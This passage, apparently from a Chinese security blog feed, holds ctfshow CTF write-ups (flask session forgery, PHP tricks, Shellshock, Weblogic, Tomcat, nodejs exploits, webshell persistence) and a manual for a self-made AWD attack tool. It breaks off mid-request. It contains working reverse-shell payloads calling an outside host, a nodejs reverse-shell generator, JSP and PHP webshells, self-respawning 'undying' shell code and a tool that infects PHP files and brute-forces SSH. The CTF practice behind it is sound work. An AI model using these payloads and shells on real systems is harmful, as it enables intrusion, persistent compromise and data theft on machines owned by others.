先看第一个：if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#39;0x8&#39;)) === _0x47df21[_0x51ee(&#39;0x1&#39;)](9, 12))对应的就是9-12位是window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](&#39;9-12&#39;, &#39;BE*&#39;);，值为’BE*’
第二个：if (window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]](_0x51ee(&#39;0x2&#39;)) === _0x47df21[&#39;substring&#39;](4, 7)) &#123;密码的4-7位就是window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]](_0x51ee(&#39;0x2&#39;), _0x51ee(&#39;0xb&#39;));,值为_0x51ee(&#39;0xb&#39;)
其他的以此类推但是有两个特殊的地方，第4-7和第16第4-7值为_0x51ee(&#39;0xb&#39;)，对应的是_0x575c数组的第11位,值为bb=第16值为_0x51ee(&#39;0x9&#39;)，对应的是_0x575c数组的第9为，值为^7M
我的分析过程图：
WEB736题目出自[PASECA2019]honey_shop
打开题目，是一个商店，还有一个价值$1337的flag，但我们只有$1336所以这一题的目标应该是修改价格来购买flag了
抓包可以看到session的值
通过脚本解密
#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload):    payload, sig = payload.rsplit(b&#x27;.&#x27;, 1)    payload, timestamp = payload.rsplit(b&#x27;.&#x27;, 1)    decompress = False    if payload.startswith(b&#x27;.&#x27;):        payload = payload[1:]        decompress = True    try:        payload = base64_decode(payload)    except Exception as e:        raise Exception(&#x27;Could not base64 decode the payload because of &#x27;                         &#x27;an exception&#x27;)    if decompress:        try:            payload = zlib.decompress(payload)        except Exception as e:            raise Exception(&#x27;Could not zlib decompress the payload before &#x27;                             &#x27;decoding the payload&#x27;)    return session_json_serializer.loads(payload)if __name__ == &#x27;__main__&#x27;:    print(decryption(sys.argv[1].encode()))
得到&#123;&#39;balance&#39;: 1336, &#39;purchases&#39;: []&#125;其中balance为当前余额，purchases值为空
如果我们要伪造session，修改余额，那么就需要知道SECRET_KEY的值
页面中还有一个提示*click to download our sweet images*下载后格式为/download?image=，这种格式容易造成任意文件读取
读取环境变量中的python版本和SECRET_KEY

&#x2F;proc&#x2F;self&#x2F;environ:当前正在运行的进程的环境变量列表


拿到SECRET_KEY后就可以进行session伪造了要注意python3和python2的结果不一样，所以上一步读了python的版本脚本地址
修改金额后进行伪造python flask_session_cookie_manager3.py encode -s &quot;ctfshowsecretkeyhereyouneverknow&quot; -t &quot;&#123;&#39;balance&#39;: 1337, &#39;purchases&#39;: []&#125;&quot; 

再次购买，购买成功
WEB743F12
&lt;!-- CTFSHOW hint:            if($a != $b &amp;&amp; md5($a) == md5($b))            &#123;                if ($c != $d &amp;&amp; sha1($c) == sha1($d))                &#123;                    echo $flag;                &#125;            &#125;        --&gt;
简单弱比较，传数组
WEB756&#x2F;source.txt得到源码
include &quot;flag.php&quot;;$code = $_POST[&#x27;code&#x27;];eval(&quot;var_dump($$code);&quot;);
这一题重点是理解$$code；
举个例子$$b其实相当于$($b),所以会输出1
理解后很容易想到php中自带的变量之一$GLOBALS传入后就会以数组的形式返回值，得到flag
WEB758&#x2F;source.txt得到源码
$url = $_GET[&#x27;url&#x27;];$file = &#x27;./spider/&#x27;.$_GET[&#x27;file&#x27;];if((strpos($url,&#x27;http://127.0.0.1/&#x27;) === 0) || strpos($url,&#x27;https://www.baidu.com/&#x27;) === 0)&#123;  file_put_contents($file, file_get_contents($url));  die(&quot;文件保存在$file&quot;);&#125;
首先限制了开头的字符串必须是http://127.0.0.1/或https://www.baidu.com/然后从$url获取内容然后写入$file
首先传入?url=http://127.0.0.1/&amp;file=&lt;?php phpinfo();?&gt;看到成功保存了那么我们可以将这个内容再次保存到文件中
即?url=http://127.0.0.1/?url=http://127.0.0.1/&amp;file=&lt;?php phpinfo();?&gt;&amp;file=1.php
但是要注意的是要因为访问两次所以url编码两次
所以payload为?url=http://127.0.0.1/?url=http://127.0.0.1/%26file=%253C%253Fphp%2520phpinfo%2528%2529%253B%2520%253F%253E&amp;file=1.php
访问1.php就行了
WEB760F12
CTFSHOW hint:                  if (ereg (&#x27;\.&#x27;, $_GET[&#x27;^_^&#x27;])) $smile = 0;                  if (ereg (&#x27;%&#x27;, $_GET[&#x27;^_^&#x27;])) $smile = 0;                  if (ereg (&#x27;[0-9]&#x27;, $_GET[&#x27;^_^&#x27;])) $smile = 0;                  if (ereg (&#x27;http&#x27;, $_GET[&#x27;^_^&#x27;]) ) $smile = 0;                  if (ereg (&#x27;https&#x27;, $_GET[&#x27;^_^&#x27;]) ) $smile = 0;                  if (ereg (&#x27;ftp&#x27;, $_GET[&#x27;^_^&#x27;])) $smile = 0;                  if (ereg (&#x27;telnet&#x27;, $_GET[&#x27;^_^&#x27;])) $smile = 0;                  if (ereg (&#x27;_&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])) $smile = 0;                  if ($smile) &#123;                      if (@file_exists ($_GET[&#x27;^_^&#x27;])) $smile = 0;                  &#125;                  if ($smile) &#123;                    $smile = @file_get_contents ($_GET[&#x27;^_^&#x27;]);                    if ($smile === &quot;(●&#x27;◡&#x27;●)&quot;) die($flag);                  &#125;

$_SERVER[&quot;QUERY_STRING&quot;] 获取的是?后面的值,比如http://localhost/aaa/index.php?p=222&amp;q=333中$_SERVER[&#39;QUERY_STRING&#39;] = &quot;p=222&amp;q=333&quot;;
$_GET[&#39;^_^&#39;]就包含了_，但是$_SERVER[&quot;QUERY_STRING&quot;]却不允许有_,这是矛盾的
在php中变量名中的点和空格会被转换成下划线。例如 &lt;input name=&quot;a.b&quot; /&gt; 变成了 $_REQUEST[&quot;a_b&quot;]这样我们可以传入^.^来绕过
file_exists判断文件是否存在，这里必须不存在，但是却要file_get_contents读到文件内容
因为http等协议被禁用，所以不能远程包含了，这里采用data://来读取
而且file_exists 对于 data 指向内容判断为不存在
最终的payload为：?^.^=data://text/plain,(●&#39;◡&#39;●)或?^.^=data://text/plain;charset=unicode,(●&#39;◡&#39;●)
WEB761F12
if($value==md5($value))&#123;                  echo $flag;                &#125;
百度一个0e开头的值，且这个值md5后还是0e开头
WEB764source.txt看到源码
session_start();if(isset($_GET[&#x27;id&#x27;]))&#123;  $login = $_GET[&#x27;id&#x27;];  if(!@isset($login[&#x27;cookie&#x27;])||$login[&#x27;cookie&#x27;] != @md5($_SESSION[&#x27;flag&#x27;]))&#123;      die(&#x27;error!&#x27;);  &#125;else&#123;      mt_srand(substr($login[&#x27;cookie&#x27;],17,7));      $content = &quot;&lt;?php \$flag=&quot;.&quot;&#x27;&quot;.$flag.&quot;&#x27;&quot;.&quot;?&gt;&quot;;      $filename = (string)mt_rand().&quot;.php&quot;;      file_put_contents($filename,$content);      mt_srand(mt_rand());      if ($_POST[&#x27;key&#x27;] == mt_rand())      &#123;          echo file_get_contents($&#123;$_POST[mt_rand()]&#125;);      &#125;  &#125;&#125;

第一个if判断：因为!isset($login[&#39;cookie&#39;])肯定为false所以要满足$login[&#39;cookie&#39;]与md5($_SESSION[&#39;flag&#39;])相等
在本地跑出md5($_SESSION[&#39;flag&#39;])结果为d41d8cd98f00b204e9800998ecf8427e
&lt;?phpsession_start();$a = md5($_SESSION[&#x27;flag&#x27;]);echo $a;?&gt;

根据题目传?id[cookie]=d41d8cd98f00b204e9800998ecf8427e,不在返回error
else内容分析：以cookie中第17位开始向后7位,播种随机数生成器
mt_srand(substr($login[&#x27;cookie&#x27;],17,7));

拼接字符串和flag，赋给$content
$content = &quot;&lt;?php \$flag=&quot;.&quot;&#x27;&quot;.$flag.&quot;&#x27;&quot;.&quot;?&gt;&quot;;


返回一个随机数，并加上.php后缀,赋给$filename
$filename = (string)mt_rand().&quot;.php&quot;;

写入文件
file_put_contents($filename,$content);


以随机数生成器生成的第二个随机数重新生成新的随机数生成器
mt_srand(mt_rand());


POST传参,令参数key与新的随机数生成器生成的随机数相等,即可进入IF判断
if ($_POST[&#x27;key&#x27;] == mt_rand())


生成第二个随机数
echo file_get_contents($&#123;$_POST[mt_rand()]&#125;);


本地构写几个mt_rand()结果,源码如下
&lt;?phperror_reporting(0);session_start();mt_srand(substr(&#x27;d41d8cd98f00b204e9800998ecf8427e&#x27;,17,7));echo mt_rand().&#x27;&lt;/br&gt;&#x27;;mt_srand(mt_rand());echo mt_rand().&#x27;&lt;/br&gt;&#x27;;echo mt_rand().&#x27;&lt;/br&gt;&#x27;;?&gt;
运行结果如下，可以看到结果是固定的，这就是php的伪随机数问题
1160121479&lt;/br&gt;954576979&lt;/br&gt;1277894509&lt;/br&gt;

POST传参，参数名为新的随机数生成器生成的第二个随机数
echo file_get_contents($&#123;$_POST[mt_rand()]&#125;);


最后POST传：key&#x3D;954576979&amp;1277894509&#x3D;filename
因为$_POST[mt_rand()]前还有一个$,所以传入的filename会变成$filename,这样就读到了flag
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctfshow-web入门</tag>
      </tags>
  </entry>
  <entry>
    <title>awd工具开发&amp;使用说明</title>
    <url>/posts/48fe3a65/</url>
    <content><![CDATA[文章演示版本：V4.0.0最新版本：V4.0.0最后更新日期：2025&#x2F;07&#x2F;01
目标生成
使用场景：在目标扫描前如果没有下发靶机地址列表，则需要自己生成一份去扫描

ip段生成
使用场景：裁判给了一个C段（192.168.10.0），所有队伍的靶机都在这个C段中，具体ip需要自己发现生成文件：ip.txt


输入192.168.10.*又或者是10.10.*.1(用*占位)即可在程序当前运行目录下覆盖生成一个ip.txt
192.168.10.1:8080192.168.10.2:8080192.168.10.3:8080192.168.10.4:8080192.168.10.5:8080......192.168.10.251:8080192.168.10.252:8080192.168.10.253:8080192.168.10.254:8080192.168.10.255:8080

单ip多端口生成
使用场景：某些小型比赛或训练赛，为了节约资源将所有靶机映射在同一台服务器的不同端口上生成文件：ip.txt


同样的会在程序运行目录下覆盖生成ip.txt
192.168.100.103:10000192.168.100.103:10001192.168.100.103:10002192.168.100.103:10003......192.168.100.103:10297192.168.100.103:10298192.168.100.103:10299192.168.100.103:10300


bugku专用
使用场景：针对线上的域名生成 例如 192-168-1-X.pvp3553.bugku.cn生成文件：ip.txt


按以下规则输入即可,&#123;&#125;中表示生成的范围，以-分割
192-168-1-&#123;1-255&#125;.pvp3553.bugku.cn192-168-&#123;1-2&#125;-&#123;1-255&#125;.pvp3553.bugku.cn

在当前目录下覆盖生成ip.txt
192-168-1-1.pvp3553.bugku.cn192-168-1-2.pvp3553.bugku.cn192-168-1-3.pvp3553.bugku.cn192-168-1-4.pvp3553.bugku.cn......192-168-1-252.pvp3553.bugku.cn192-168-1-253.pvp3553.bugku.cn192-168-1-254.pvp3553.bugku.cn192-168-1-255.pvp3553.bugku.cn


目标扫描
使用场景：自己生成靶机地址或通过平台下载后，进行特征扫描来识别题目生成文件：&lt;自命名&gt;.txt

web靶机扫描先打开自己的web靶机，输入网页上可以看到的特征即可

pwn靶机扫描pwn靶机也是同理，先连上自己的看看会输出什么就填什么

写入不死马
使用场景：发现题目的默认后门或者rce点后写入不死马生成文件：shell.txt  random.txt

在可以rce的参数后加*，多个参数用&amp;连接
&lt;?php@eval($_POST[&#x27;admin_ccmd&#x27;]);?&gt;
如上，则在post中填入admin_ccmd=*

代码执行：根据shell中的代码(例如eval或者system)来使用不同的payload非常规路径：对于网站目录不是常规的/var/www/html的情况下或者网站根目录没有写权限时使用，左框填绝对路径(需要可写)，右框填在网页中的体现。
例如现在有一个网站结构如下
/wwwroot/├── index.php├── upload├── xx└── xxx

并且根目录不可写
那么就左框需要填写/wwwroot/upload  右框需要填写/upload/

设置中还可以调整使用的shell
shell1:一般复杂度。会在写入的所有子目录下繁殖生成不死马shell2:比较复杂。会循环感染所有php后缀的文件(写入一句话，密码和参数与不死马是一样的)，同时对不死马传入`_`可以返回所有感染的文件shell3:最简单的不死马。没有额外功能



设置-&gt;管理禁用函数
可以对disable_functions进行配置，使用不同的payload写马可以手动输入或者输入一个phpinfo网址(用命令执行的不行)

设置-&gt;查看可用函数
可以查看当前可用的函数


默认马通过Get传参的默认后门写入不死马：

通过Post传参的默认后门写入不死马(根目录不可写)：

通过Header传参的默认后门写入不死马：

同时会在当前目录下追加生成一个shell.txt来保存记录
自定义不死马
使用场景：想写入自己自定义的不死马

当勾选这个功能后，可以自定义不死马的内容
例如一个不死马如下，密码是123456，访问的文件名是.666.php
&lt;?php    ignore_user_abort(true);    set_time_limit(0);    unlink(__FILE__);    $file = &#x27;.666.php&#x27;;    $code = &#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;e10adc3949ba59abbe56e057f20f883e&quot;)&#123;@eval($_POST[&quot;aa&quot;]);&#125; ?&gt;&#x27;;    while (1)&#123;        file_put_contents($file,$code);        system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .666.php&#x27;);        usleep(1);    &#125;?&gt;

使用前需要base64编码一次（工具页中提供base64加解密功能）
PD9waHAKICAgIGlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwogICAgc2V0X3RpbWVfbGltaXQoMCk7CiAgICB1bmxpbmsoX19GSUxFX18pOwogICAgJGZpbGUgPSAnLjY2Ni5waHAnOwogICAgJGNvZGUgPSAnPD9waHAgaWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iZTEwYWRjMzk0OWJhNTlhYmJlNTZlMDU3ZjIwZjg4M2UiKXtAZXZhbCgkX1BPU1RbImFhIl0pO30gPz4nOwogICAgd2hpbGUgKDEpewogICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCRjb2RlKTsKICAgICAgICBzeXN0ZW0oJ3RvdWNoIC1tIC1kICIyMDE4LTEyLTAxIDA5OjEwOjEyIiAuNjY2LnBocCcpOwogICAgICAgIHVzbGVlcCgxKTsKICAgIH0KPz4=



随机文件名
使用场景：防止其他队伍监控流量进行蹭车

勾选后写入的shell的文件名，密码，连接参数随机产生

会在当前目录下追加生成random.txt来保存shell记录
执行命令
使用场景：通过不死马或者其他漏洞点进行命令执行

一般shell执行命令
通过随机马执行命令命令也会受到设置中disable_function的影响

获取flag
使用场景：批量获取窗口中的flag（通用。如果在其他页面也获取到了flag也可以使用此功能）生成文件：flag.txt

需要先通过执行cat /flag或curl获取到flag

点击获取flag按钮后，程序会自动在返回的结果中搜索包含flag&#123;&#125;的值并保存到flag.txt中
如果flag格式并不是flag&#123;&#125;，则可以自定义匹配的正则表达式
提交flag
使用场景：批量获取到flag后自动访问提交接口进行提交flag

flag用*占位。多个参数用&amp;分割。注意在设置页中设置线程数或者选择延时（选择延时后线程失效），太大容易丢包
Get方式：http://192.168.100.50:4444/api/flag?token=xxxx&amp;flag=xxxx

Post方式：

ssh
使用场景：ssh弱口令生成文件：ssh.txt new_ssh.txt

比如裁判下发的ssh地址为x.x.x.x:2222 密码：ctf@awd，就可以知道所有队伍都是这个密码。而且有些比赛不设置防御时间，一开始就能连到其他队伍的ssh（这里就不得不提到某年的宁波市awd）
ssh扫描扫描受到网络等影响，有些时候可能会漏报，建议多执行几次(会自动去重)

扫描结果会保存在ssh.txt
ssh密码更改密码的复杂度有一定要求（看靶机的环境），建议设置的复杂一点

多人
使用场景：离线环境下 局域网中队友的信息传递

其中A先当服务端(需要先在设置中设置好参数)

然后A点击启动服务

其余队友B和C当客户端(同样要先在设置中设置好参数)


B和C设置好后点击连接服务即可

A B C 多人交互效果

主动点击断开效果

自定义
使用场景：1：批量发送一些请求，例如批量上传文件。2：提交flag。3：执行简单的pwn攻击

执行自定义请求比如发现一个文件上传，然后进行批量上传

提交flag
如果觉得提交flag的参数过于多，又或者根本没有api接口的奇安信平台。就可以抓包后在这提交。提交时自动延时1秒

将flag的位置替换成&#123;&#123;&#123;flag&#125;&#125;&#125;即可，程序会自动读取软件运行目录下的flag.txt进行替换
GET /api/flag?flag=&#123;&#123;&#123;flag&#125;&#125;&#125; HTTP/1.1Host: 192.168.100.50:4444Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: PHPSESSID=8me6lcna20rpmb9dfb3e6qvha3Connection: keep-alive



执行简单的pwn攻击
可以执行简单的脚本（没有经过实战测试，所以可能有些bug）

例子如下，需要注意的是要选择 安装过脚本中导入的库的 python路径
如果没有自动识别到，也可以手动更改路径
from pwn import *p=remote(&#x27;192.168.100.50&#x27;,10101,timeout=1)context.os=&#x27;linux&#x27;max_=100min_=0while True:	num=(max_+min_)//2	p.sendlineafter(b&quot;&gt;&gt;&quot;,str(num).encode())	try:		d=p.readline(timeout=1)	except:		break	if b&#x27;Small&#x27; in d:		if (min_==max_-1):			p.sendlineafter(b&quot;&gt;&gt;&quot;,str(max_).encode())			break		min_=num	elif b&#x27;Big&#x27; in d:		if (min_==max_-1):			p.sendlineafter(b&quot;&gt;&gt;&quot;,str(min_).encode())			break		max_=num	else:		break	print(max_,min_,d)context.log_level=&#x27;debug&#x27;p.sendline(b&#x27;cat /flag&#x27;)p.readuntil(b&#x27;flag&#123;&#x27;)



然后可以使用执行命令页面的获取flag来提取flag（这个功能是通用的，只要有flag出现在屏幕内）
定时任务
使用场景：解放双手，自动运行生成文件：log&#x2F;task_log.txt

在写入不死马，执行命令，提交flag三处可以选择定时执行任务，最短1分钟执行一次
使用方法与正常操作一样，填完参数后点击定时按钮并选择时间即可
需要注意的是，目前实现的方式是定时点击按钮，所以填入的内容不要在运行期间更改，否则可能会执行失败

如果想取消可以关闭程序或者在全局设置中点击 管理定时任务 按钮

运行结果会保存在log/task_log.txt

注意：此功能应谨慎使用，防止发送网络流量过大！注意观察 task_log.txt 的内容

工具&amp;设置
使用场景：base64，url的编码与解码，行去重与清屏

支持拖放文件

全局设置中可以切换线程数量和超时时间，并且可以选择是否记录错误日志

笔记
使用场景：在离线环境下提供一些命令，仅供参考！！生成文件：note.txt


其中自定义按钮可以自己记录一些临时的路径，密码之类的信息，会实时保存在当前目录下的note.txt
更新日志V1.0.0：初始版本V1.1.0：添加多种扫描方式，优化代码逻辑V1.2.0：添加随机不死马功能，修复诺干bug
V2.1.0：整体70%代码重构(扫描速度较上一代提升11倍)。新增ssh模块和设置模块V2.1.1：优化不死马的判断逻辑V2.2.0：新增局域网多人聊天模块V2.2.1：修复了若干BUGV2.2.2：更新ui，新增自定义请求包模块V2.2.3：添加全局超时时间设置，优化写入不死马模块(区分代码执行和命令执行，适应tp框架路径)
V3.0.0：新增一机一码，添加记录错误日志功能，优化写入不死马&#x2F;执行命令的逻辑V3.0.1：部分代码结构优化，添加定时任务功能V3.1.0：优化ip生成功能，添加head执行命令功能，优化复杂路径的适配，优化冗余代码V3.1.1：优化自定义模块(集成简单的pwn批量脚本执行&#x2F;自识别flag)，新增笔记模块，优化总体使用体验V3.1.2：添加进度提示，增加新logoV3.1.3：修复一个严重BUG
V4.0.0：优化重构大量代码(全局设置，多人模块细节)，结构标准化，优化shell
同时感谢以下师傅对AWD_RAH提出的宝贵建议

            @Datch （定时运行）@liangmo （head头一句话）@淡灬看夏丶恋雨(a13niL) （笔记功能）@蓝猫少爷 （另一种提交flag的方式）
          


另外也感谢以下师傅反馈的bug

            @t1me0
          ]]></content>
      <categories>
        <category>项目</category>
      </categories>
      <tags>
        <tag>awd</tag>
        <tag>自动化</tag>
        <tag>自研工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】web入门-权限维持</title>
    <url>/posts/55be078a/</url>
    <content><![CDATA[WEB670-WEB676这几题做法都一样发现/var/www/html目录可写，既然是权限维持，那么直接传不死马
&lt;?phpset_time_limit(0);ignore_user_abort(1);unlink(__FILE__);while (1) &#123;$content = &#x27;&lt;?php @eval($_POST[&quot;shell&quot;]) ?&gt;&#x27;;file_put_contents(&quot;.bk.php&quot;, $content);usleep(10000);&#125;?&gt;
访问一次不死马，会发现目录下生成了.bk.php然后check，我推测这个check应该只是删除了当前目录的所有文件，并没有其他操作因为我们的马是不断生成的，所以依旧可以访问这样就拿到了这个靶机的权限和flag
WEB677-WEB678发现没有权限写入文件实在没招了，在g4👴那里学了一招
system(&#x27;while true;do cat /f*;done&#x27;);

在一个窗口发送后进程会锁死，另一个窗口check第一个窗口就会不断返回flag
原理大概是因为不杀进程，所以用死循环一直cat flag
WEB679在可写的&#x2F;tmp目录下传木马并写系统命令，然后提交5秒内进⾏check，check会关闭nginx和php-fpm，由于是www-data权限，⽆法启动nginx和php-fpm，直接启动php内置服务器即可
cmd=file_put_contents(&quot;/tmp/index.php&quot;,&quot;&lt;?php eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot;);system(&quot;sleep 5 &amp;&amp; php -S 0.0.0.0:80 -t /tmp/&quot;);
注意特殊字符编码传入后可以在蚁剑看看有没有成功写入phpflag在根目录（出现Notice: Undefined index: a in /tmp/index.php on line 1是正常情况）
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctfshow-web入门</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】web入门-组件漏洞</title>
    <url>/posts/605e5ac9/</url>
    <content><![CDATA[
WEB580–WEB599


WEB580根据题目所给的提示“破壳”，那么应该是Shellshock 破壳漏洞（CVE-2014-6271）这一题试了很多种payload，除了能看&#x2F;etc&#x2F;passwd，其他都没有回显或返回500，无奈只能反弹shell（还是太菜了）payload：() &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/cn1.utools.club/37634 0&gt;&amp;1;发送如下数据包
GET /cgi-bin/index.cgi HTTP/1.1Host: 7f35523e-4939-43d8-8a05-f6348618a843.challenge.ctf.show:8080Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1lewiserii: () &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/cn1.utools.club/37634 0&gt;&amp;1;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://7f35523e-4939-43d8-8a05-f6348618a843.challenge.ctf.show:8080/cgi-bin/victim.cgiAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: UM_distinctid=179eb628608d03-066c8283766a21-f7f1939-1bcab9-179eb62860986dConnection: close
拿到shell
WEB581具体可以参考CVE-2017-6920payload：
content=!php/object O:3:&quot;log&quot;:2:&#123;s:8:&quot;filename&quot;;s:5:&quot;1.php&quot;;s:7:&quot;content&quot;;s:24:&quot;&lt;?php eval($_POST[1]);?&gt;&quot;;&#125;

只要带上!php&#x2F;object  后面就会进行反序列化写入文件后访问
WEB582nodejsshell.py
import sysif len(sys.argv) != 3:    print &quot;Usage: %s &lt;LHOST&gt; &lt;LPORT&gt;&quot; % (sys.argv[0])    sys.exit(0)IP_ADDR = sys.argv[1]PORT = sys.argv[2]def charencode(string):    &quot;&quot;&quot;String.CharCode&quot;&quot;&quot;    encoded = &#x27;&#x27;    for char in string:        encoded = encoded + &quot;,&quot; + str(ord(char))    return encoded[1:]print &quot;[+] LHOST = %s&quot; % (IP_ADDR)print &quot;[+] LPORT = %s&quot; % (PORT)NODEJS_REV_SHELL = &#x27;&#x27;&#x27;var net = require(&#x27;net&#x27;);var spawn = require(&#x27;child_process&#x27;).spawn;HOST=&quot;%s&quot;;PORT=&quot;%s&quot;;TIMEOUT=&quot;5000&quot;;if (typeof String.prototype.contains === &#x27;undefined&#x27;) &#123; String.prototype.contains = function(it) &#123; return this.indexOf(it) != -1; &#125;; &#125;function c(HOST,PORT) &#123;    var client = new net.Socket();    client.connect(PORT, HOST, function() &#123;        var sh = spawn(&#x27;/bin/sh&#x27;,[]);        client.write(&quot;Connected!\\n&quot;);        client.pipe(sh.stdin);        sh.stdout.pipe(client);        sh.stderr.pipe(client);        sh.on(&#x27;exit&#x27;,function(code,signal)&#123;          client.end(&quot;Disconnected!\\n&quot;);        &#125;);    &#125;);    client.on(&#x27;error&#x27;, function(e) &#123;        setTimeout(c(HOST,PORT), TIMEOUT);    &#125;);&#125;c(HOST,PORT);&#x27;&#x27;&#x27; % (IP_ADDR, PORT)print &quot;[+] Encoding&quot;PAYLOAD = charencode(NODEJS_REV_SHELL)print &quot;eval(String.fromCharCode(%s))&quot; % (PAYLOAD)
通过nodejsshell.py生成payload放入&#123;&quot;username&quot;:&quot;_$$ND_FUNC$$_function ()&#123;生成的payload&#125;()&quot;,&quot;password&quot;:123&#125;,然后base64编码加url编码bp抓包，构造一个user并传入payload成功反弹shell
WEB583CVE-2016-10033在github上找到了exp直接打就行了
但是这里有个地方要注意现在（6.17）github上的exp是打不通的我把这个和以前在github上下的版本用beyond比对了一下！ 竟然不一样，如果你用官网的打不通可以试试我这个版本,提取码是f3rw
WEB584生成数字exp(将echo后的内容替换成你自己的反弹一句话)
payload = b&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9jbjEudXRvb2xzLmNsdWIvNDUyMTQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;bytecode = &#x27;,&#x27;.join(str(i) for i in list(payload))print(bytecode)

payload
[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;生成的数字&#125;))/lastname&quot;, &quot;value&quot;: &quot;ctfshow&quot; &#125;]
首先post &#x2F;api&#x2F;people新建一个用户,获取到id
然后通过PATCH &#x2F;api&#x2F;people&#x2F;1，可以rce反弹shell注意Content-Type的格式

WEB585Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）直接抓包传即可，但是要注意tomcat对文件后缀有一定验证，（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用&#x2F;）来绕过限制。
拿到shell
jsp小马（pwd&#x3D;023）
&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c)&#123;    StringBuilder line = new StringBuilder();try&#123;    Process pro = Runtime.getRuntime().exec(c);    BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));    String temp = null;    while ((temp = buf.readLine()) != null)    &#123;        line.append(temp+&quot;\\n&quot;);    &#125;    buf.close();&#125;catch (Exception e)&#123;    line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))&#123;    out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;/pre&gt;&quot;);&#125;else&#123;    out.println(&quot;:-)&quot;);&#125;%&gt;

WEB586wordpress环境，首先尝试弱口令，进不去，只好创建一个用户进行测试发现里面有一篇文章介绍了这个插件漏洞使用百度，发现对于下面这个地址的id参数（post）存在sql注入，因为没有过滤直接带入了sql语句，所以造成了sql注入IP&#x2F;wp-admin&#x2F;admin-ajax.php?action&#x3D;populate_download_edit_form
我用sqlmap跑出来了，也可以手注（使用load_file读文件）
WEB587Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）漏洞使用了XMLDecoder来解析用户传入的XML数据，但在在解析的过程中出现反序列化漏洞，导致可执行任意命令。
发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：POC
POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: e40b731a-4abf-4e0b-acaf-c03997996db7.challenge.ctf.show:8080Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://e40b731a-4abf-4e0b-acaf-c03997996db7.challenge.ctf.show:8080/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: UM_distinctid=179eb628608d03-066c8283766a21-f7f1939-1bcab9-179eb62860986dConnection: closeContent-Type: text/xmlContent-Length: 641&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/cn1.utools.club/45214 0&amp;gt;&amp;amp;1&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void 